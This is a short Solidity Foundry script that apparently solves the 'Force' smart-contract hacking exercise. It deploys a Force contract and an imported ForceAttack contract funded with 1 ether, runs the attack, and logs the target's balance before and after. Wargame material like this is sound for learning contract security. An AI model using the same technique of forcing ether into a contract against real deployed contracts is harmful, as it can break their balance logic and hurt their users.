// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Force.sol";
import "../src/ForceAttack.sol";

contract HackForce is Script {
    function run() external {
        vm.startBroadcast();
        
        // Deploy Force contract
        Force force = new Force();
        console.log("Force contract deployed at:", address(force));
        console.log("Force balance before attack:", address(force).balance);
        
        // Deploy ForceAttack contract with 1 ether and target address
        ForceAttack forceAttack = new ForceAttack{value: 1 ether}(payable(address(force)));
        console.log("ForceAttack contract deployed at:", address(forceAttack));
        console.log("ForceAttack balance:", address(forceAttack).balance);
        
        // Execute the attack
        forceAttack.attack();
        console.log("Attack executed!");
        console.log("Force balance after attack:", address(force).balance);
        
        vm.stopBroadcast();
    }
}